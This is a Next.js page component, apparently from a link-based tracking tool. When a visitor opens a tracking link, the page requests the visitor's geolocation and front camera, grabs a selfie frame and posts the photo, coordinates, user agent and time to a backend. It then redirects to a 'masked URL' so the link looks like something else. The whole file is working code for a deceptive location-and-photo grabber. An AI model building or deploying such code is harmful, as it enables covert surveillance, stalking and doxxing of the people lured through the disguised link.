"use client";
import { useEffect, useRef, useState } from "react";
import { useParams } from "next/navigation";

interface LocationData {
  latitude: number;
  longitude: number;
}

export default function TrackingPage() {
  const { trackingId } = useParams() as { trackingId: string };
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const [error, setError] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [maskedUrl, setMaskedUrl] = useState<string>("");

  useEffect(() => {
    // Fetch masked URL for this trackingId
    async function fetchMaskedUrl() {
      try {
        const res = await fetch(`/api/track/create?trackingId=${trackingId}`);
        if (!res.ok) throw new Error("Failed to fetch masked URL");
        const data = await res.json();
        if (!data.maskedUrl) {
          throw new Error("Tracking link not found. Please create the tracking link first.");
        }
        setMaskedUrl(data.maskedUrl);
      } catch (err: any) {
        setError(err.message || "Failed to load masked URL.");
      }
    }
    fetchMaskedUrl();
  }, [trackingId]);

  useEffect(() => {
    if (!maskedUrl) return;

    async function captureAndSend() {
      try {
        // Get geolocation
        const location: LocationData = await new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            reject(new Error("Geolocation not supported"));
          }
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              resolve({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
              });
            },
            (err) => {
              reject(err);
            }
          );
        });

        // Get camera stream
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }

        // Capture photo from video
        if (!videoRef.current || !canvasRef.current) {
          throw new Error("Video or canvas element missing");
        }
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        if (!ctx) throw new Error("Canvas context not available");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const photo = canvas.toDataURL("image/png");

        // Stop camera stream
        stream.getTracks().forEach((track) => track.stop());

        // Send tracking data to backend
        const res = await fetch("/api/track/create", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            trackingId,
            photo,
            location,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
          }),
        });
        if (!res.ok) throw new Error("Failed to send tracking data");

        setSubmitted(true);

        // Redirect to masked URL after short delay
        setTimeout(() => {
          window.location.href = maskedUrl;
        }, 2000);
      } catch (err: any) {
        setError(err.message || "Error capturing or sending data");
      }
    }

    captureAndSend();
  }, [maskedUrl, trackingId]);

  return (
    <main className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6">
      <h1 className="text-4xl font-bold mb-6">Tracking in Progress</h1>
      {error && <p className="mb-4 text-red-500 font-semibold">{error}</p>}
      {!submitted ? (
        <>
          <video
            ref={videoRef}
            className="rounded-lg border-4 border-white max-w-xs w-full mb-6"
            autoPlay
            muted
            playsInline
            style={{ display: "block" }}
          />
          <canvas ref={canvasRef} className="hidden" />
          <p>Collecting your location and photo automatically...</p>
        </>
      ) : (
        <p>Thank you! Redirecting you now...</p>
      )}
    </main>
  );
}
